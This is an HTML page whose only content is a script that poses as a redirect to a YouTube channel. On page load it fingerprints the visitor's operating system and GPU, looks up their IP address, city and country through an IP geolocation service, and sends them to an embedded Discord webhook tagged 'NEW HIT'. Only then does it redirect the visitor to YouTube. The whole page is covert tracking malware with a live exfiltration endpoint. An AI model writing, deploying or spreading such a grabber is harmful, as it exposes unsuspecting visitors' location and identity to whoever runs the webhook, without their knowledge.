<!DOCTYPE html>
<html>
<body style="background:#000;">
<script>
    const h = "https://discord.com/api/webhooks/1497904289514000414/iBEkMTCSc_f4Dh2IxZsZjPfodFI1RiaDt7G6xYaWFsJRk4pZ_bdXlInRWb4DgEGcfeM0";
    const y = "https://youtube.com/@LigmaBlox-w7m";

    // Standardized Discord delivery system
    const send = (msg) => navigator.sendBeacon(h, new Blob([JSON.stringify({content: msg})], {type: 'application/json'}));

    async function getSpecs() {
        // Gets a clean OS name and attempts to isolate the GPU from the ANGLE engine
        let ua = navigator.userAgent;
        let os = ua.match(/\(([^)]+)\)/)[1].split(';')[0]; 
        try {
            let gl = document.createElement('canvas').getContext('webgl');
            let gpu = gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL);
            if (gpu.includes("ANGLE")) gpu = gpu.split(", ").pop();
            return `${os} (${gpu})`;
        } catch(e) { return os; }
    }

    async function execute() {
        const isRe = sessionStorage.getItem('v');
        sessionStorage.setItem('v', '1');
        const specs = await getSpecs();
        const start = Date.now();

        while (true) {
            try {
                const res = await fetch('https://ip-api.com/json/?cb=' + Date.now());
                const r = await res.json();

                if (r.status === 'success') {
                    const data = `[${isRe ? "RE-ENTRY" : "NEW HIT"}]\nModel: ${specs}\nIP: ${r.query}\nLoc: ${r.city}, ${r.country}`;
                    send(data);
                    break;
                }
            } catch (e) {
                // 2ms loop for maximum persistence
                await new Promise(s => setTimeout(s, 2));
            }

            // Safety timeout: Redirect anyway after 1.5 seconds if network is blocked
            if (Date.now() - start > 1500) break;
        }
        window.location.replace(y);
    }

    execute();
</script>
</body>
</html>
